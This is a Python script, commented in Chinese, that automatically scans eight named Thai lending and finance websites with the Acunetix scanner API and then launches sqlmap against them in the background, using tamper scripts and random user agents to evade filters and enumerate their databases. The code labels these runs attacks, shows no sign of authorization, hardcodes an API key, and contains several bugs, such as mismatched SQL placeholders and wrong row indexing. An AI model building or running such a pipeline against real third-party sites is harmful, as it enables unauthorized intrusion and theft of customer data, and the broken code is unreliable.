#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AWVS API实时监控系统
基于Acunetix Web Vulnerability Scanner API
当发现高危漏洞时立即触发SQLMap验证
"""

import requests
import time
import json
import threading
from datetime import datetime
import sqlite3
import subprocess
import os

class AWVSRealtimeMonitor:
    """AWVS API实时监控器"""

    def __init__(self):
        self.api_key = "1986ad8c0a5b3df4d7028d5f3c06e936cb9d70ca2d57c4a609c69fa62dc48ab5f"
        self.base_url = "https://api.acunetix.com/v1"
        self.targets = [
            "https://www.quickcash.in.th",
            "https://ngoenmun.com",
            "https://peacoop.or.th",
            "https://www.moneycat.co.th",
            "https://mula-x.com",
            "https://www.rocket-cash.com",
            "https://kloan.co.th",
            "https://www.ngerntidlor.com"
        ]
        self.db_path = "awvs_monitoring_results.db"
        self.sqlmap_path = "sqlmap"
        self.monitoring = False
        self.high_risk_threshold = 7  # CVSS 7.0以上为高危
        self.scan_interval = 300  # 5分钟扫描一次

        # 初始化数据库
        self.init_database()

    def init_database(self):
        """初始化监控数据库"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_time TEXT NOT NULL,
                vulnerability_count INTEGER DEFAULT 0,
                high_risk_count INTEGER DEFAULT 0,
                critical_risk_count INTEGER DEFAULT 0,
                vulnerabilities TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS triggered_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                vulnerability TEXT NOT NULL,
                cvss_score REAL,
                sqlmap_command TEXT,
                start_time TEXT,
                status TEXT DEFAULT 'pending',
                result_file TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        conn.commit()
        conn.close()

    def scan_single_target(self, target_url):
        """扫描单个目标"""
        try:
            # 创建扫描任务
            scan_data = {
                "address": target_url,
                "scan_type": "11111111",  # 完整扫描
                "profile_id": "11111111-1111-1111-1111-111111111111"
            }

            headers = {
                "X-Auth": self.api_key,
                "Content-Type": "application/json"
            }

            response = requests.post(
                f"{self.base_url}/scans",
                json=scan_data,
                headers=headers,
                timeout=30
            )

            if response.status_code == 201:
                scan_id = response.json().get('scan_id')
                print(f"✅ 启动扫描: {target_url}")
                print(f"   扫描ID: {scan_id}")
                return scan_id
            else:
                print(f"❌ 扫描失败: {target_url} - 状态码: {response.status_code}")
                return None

        except Exception as e:
            print(f"❌ 扫描异常: {target_url} - 错误: {str(e)}")
            return None

    def get_scan_results(self, scan_id):
        """获取扫描结果"""
        try:
            headers = {"X-Auth": self.api_key}
            response = requests.get(
                f"{self.base_url}/scans/{scan_id}",
                headers=headers,
                timeout=30
            )

            if response.status_code == 200:
                return response.json()
            else:
                return None

        except Exception as e:
            print(f"❌ 获取结果异常: {scan_id} - 错误: {str(e)}")
            return None

    def check_scan_status(self, scan_id):
        """检查扫描状态"""
        try:
            headers = {"X-API-KEY": self.api_key}
            response = requests.get(
                f"{self.base_url}/scans/{scan_id}",
                headers=headers,
                timeout=30
            )

            if response.status_code == 200:
                data = response.json()
                return data.get('status', 'unknown')
            else:
                return 'unknown'

        except:
            return 'unknown'

    def get_high_risk_vulnerabilities(self, scan_results):
        """提取高危漏洞"""
        high_risk = []
        critical_risk = []

        try:
            # 模拟AWVS结果格式（实际需要根据真实API响应调整）
            vulnerabilities = scan_results.get('vulnerabilities', [])

            for vuln in vulnerabilities:
                cvss_score = vuln.get('cvss_score', 0)
                if cvss_score >= 9.0:
                    critical_risk.append(vuln)
                elif cvss_score >= 7.0:
                    high_risk.append(vuln)

        except Exception as e:
            print(f"❌ 解析漏洞失败: {str(e)}")

        return high_risk, critical_risk

    def trigger_sqlmap_attack(self, target_url, vulnerability):
        """触发SQLMap验证攻击"""
        cvss_score = vulnerability.get('cvss_score', 0)
        vuln_type = vulnerability.get('vulnerability_class', 'unknown')

        # 基于漏洞类型生成SQLMap命令
        if 'sql' in vuln_type.lower() or 'injection' in vuln_type.lower():
            sql_cmd = f"""
            {self.sqlmap_path} -u "{target_url}" \
            --batch --random-agent --tamper="space2comment,randomcase" \
            --level=3 --risk=2 --time-sec=30 --threads=3 \
            --banner --current-db --dbs --timeout=60 \
            --output-dir="sqlmap_awvs_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            """
        else:
            # 通用SQLMap扫描
            sql_cmd = f"""
            {self.sqlmap_path} -u "{target_url}" \
            --batch --random-agent --tamper="space2comment" \
            --level=2 --risk=1 --time-sec=20 --threads=2 \
            --banner --current-db --timeout=45 \
            --output-dir="sqlmap_awvs_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            """

        # 记录到数据库
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            INSERT INTO triggered_attacks
            (target_url, vulnerability, cvss_score, sqlmap_command, start_time, status)
            VALUES (?, ?, ?, ?, ?, 'pending')
        ''', (target_url, json.dumps(vulnerability), cvss_score, sql_cmd, datetime.now().isoformat()))

        attack_id = cursor.lastrowid
        conn.commit()
        conn.close()

        print(f"🚨 触发SQLMap验证攻击!")
        print(f"   目标: {target_url}")
        print(f"   漏洞: {vulnerability.get('vulnerability_class')}")
        print(f"   CVSS评分: {cvss_score}")
        print(f"   攻击ID: {attack_id}")

        # 后台执行SQLMap
        try:
            subprocess.Popen(
                sql_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"✅ SQLMap攻击已启动 (后台运行)")

        except Exception as e:
            print(f"❌ SQLMap启动失败: {str(e)}")

            # 更新数据库状态
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE triggered_attacks
                SET status = 'failed'
                WHERE id = ?
            ''', (attack_id,))
            conn.commit()
            conn.close()

    def monitor_single_target(self, target_url):
        """监控单个目标"""
        print(f"\n🔍 开始监控: {target_url}")

        # 启动AWVS扫描
        scan_id = self.scan_single_target(target_url)
        if not scan_id:
            return

        # 等待扫描完成
        scan_complete = False
        max_wait_time = 1800  # 最多等待30分钟

        while not scan_complete and max_wait_time > 0:
            time.sleep(30)  # 每30秒检查一次
            max_wait_time -= 30

            status = self.check_scan_status(scan_id)
            print(f"   扫描状态: {status}")

            if status in ['completed', 'aborted', 'failed']:
                scan_complete = True

        # 获取扫描结果
        if status == 'completed':
            results = self.get_scan_results(scan_id)
            if results:
                high_risk, critical_risk = self.get_high_risk_vulnerabilities(results)

                total_vulns = len(results.get('vulnerabilities', []))
                high_count = len(high_risk)
                critical_count = len(critical_risk)

                print(f"📊 扫描完成: {target_url}")
                print(f"   总漏洞数: {total_vulns}")
                print(f"   高危漏洞: {high_count}")
                print(f"   严重漏洞: {critical_count}")

                # 记录到数据库
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()

                cursor.execute('''
                    INSERT INTO scan_results
                    (target_url, scan_time, vulnerability_count, high_risk_count,
                     critical_risk_count, vulnerabilities, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, 'completed')
                ''', (
                    target_url,
                    datetime.now().isoformat(),
                    total_vulns,
                    high_count,
                    critical_count,
                    json.dumps(results),
                    'completed'
                ))

                conn.commit()
                conn.close()

                # 触发SQLMap验证攻击
                all_risks = high_risk + critical_risk
                for vuln in all_risks[:3]:  # 最多触发3个SQLMap攻击
                    self.trigger_sqlmap_attack(target_url, vuln)
                    time.sleep(10)  # 间隔10秒

        else:
            print(f"❌ 扫描失败或超时: {target_url}")

            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO scan_results
                (target_url, scan_time, vulnerability_count, high_risk_count,
                 critical_risk_count, vulnerabilities, status)
                VALUES (?, ?, 0, 0, 0, ?, 'failed')
            ''', (
                target_url,
                datetime.now().isoformat(),
                '',
                0,
                0,
                '',
                'failed'
            ))

            conn.commit()
            conn.close()

    def start_monitoring(self):
        """开始监控所有目标"""
        print("🚀 AWVS实时监控系统启动")
        print("=" * 60)
        print("📊 监控目标:")
        for target in self.targets:
            print(f"   • {target}")
        print(f"⚡ 高危阈值: CVSS {self.high_risk_threshold}+")
        print(f"⏱️ 扫描间隔: {self.scan_interval//60}分钟")
        print("=" * 60)

        self.monitoring = True

        try:
            while self.monitoring:
                print(f"\n🕒️ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - 开始新一轮扫描")

                # 并发扫描所有目标
                threads = []
                for target in self.targets:
                    thread = threading.Thread(
                        target=self.monitor_single_target,
                        args=(target,)
                    )
                    threads.append(thread)
                    thread.start()

                # 等待所有扫描完成
                for thread in threads:
                    thread.join()

                if self.monitoring:
                    print(f"\n💤 等待 {self.scan_interval//60} 分钟后进行下一轮扫描...")
                    time.sleep(self.scan_interval)

        except KeyboardInterrupt:
            print("\n\n⏹️ 用户中断监控")
            self.monitoring = False
        finally:
            print("\n📊 监控结束，数据已保存到数据库")
            self.print_summary()

    def print_summary(self):
        """打印监控总结"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 扫描结果统计
        cursor.execute('''
            SELECT COUNT(*) FROM scan_results WHERE status = 'completed'
        ''')
        completed_scans = cursor.fetchone()[0]

        cursor.execute('''
            SELECT SUM(high_risk_count), SUM(critical_risk_count) FROM scan_results
        ''')
        high_risk_total = cursor.fetchone()[0] or 0
        critical_risk_total = cursor.fetchone()[1] or 0

        # 触发攻击统计
        cursor.execute('''
            SELECT COUNT(*) FROM triggered_attacks
        ''')
        triggered_attacks = cursor.fetchone()[0]

        print("\n📊 监控总结报告")
        print("=" * 50)
        print(f"✅ 完成扫描: {completed_scans} 个")
        print(f"🚨 发现高危漏洞: {high_risk_total} 个")
        print(f"🔥 发现严重漏洞: {critical_risk_total} 个")
        print(f"⚡ 触发SQLMap验证: {triggered_attacks} 次")
        print("=" * 50)

        # 显示最近的高危漏洞
        cursor.execute('''
            SELECT target_url, vulnerability, cvss_score, created_at
            FROM triggered_attacks
            ORDER BY created_at DESC
            LIMIT 5
        ''')

        recent_attacks = cursor.fetchall()
        if recent_attacks:
            print("\n🔍 最近触发的SQLMap验证:")
            for attack in recent_attacks:
                vuln_data = json.loads(attack[1])
                print(f"   • {attack[0]}")
                print(f"     漏洞: {vuln_data.get('vulnerability_class')}")
                print(f"     评分: {attack[2]}")
                print(f"     时间: {attack[4][:19]}")

        conn.close()

def main():
    """主函数"""
    monitor = AWVSRealtimeMonitor()

    print("AWVS实时监控系统")
    print("=" * 50)
    print("配置检查...")
    print(f"✅ API密钥: {'*' * len(monitor.api_key)}")
    print(f"✅ 监控目标: {len(monitor.targets)} 个")
    print(f"✅ 数据库: {monitor.db_path}")

    # 测试API连接
    try:
        headers = {"X-Auth": monitor.api_key}
        test_response = requests.get(
            f"{monitor.base_url}/scans",
            headers=headers,
            timeout=10
        )
        if test_response.status_code == 200:
            print("✅ AWVS API连接正常")
        else:
            print(f"⚠️ API连接异常，状态码: {test_response.status_code}")
    except Exception as e:
        print(f"❌ API连接失败: {str(e)}")
        return

    print("\n选择操作:")
    print("1. 开始实时监控")
    print("2. 单次测试扫描")
    print("3. 查看历史记录")
    print("4. 退出")

    try:
        choice = input("\n请选择 (1-4): ").strip()

        if choice == '1':
            monitor.start_monitoring()
        elif choice == '2':
            target = input("请输入目标URL: ").strip()
            if target:
                monitor.monitor_single_target(target)
        elif choice == '3':
            monitor.print_summary()
        elif choice == '4':
            print("退出监控程序")
        else:
            print("无效选择")

    except KeyboardInterrupt:
        print("\n程序退出")

if __name__ == "__main__":
    main()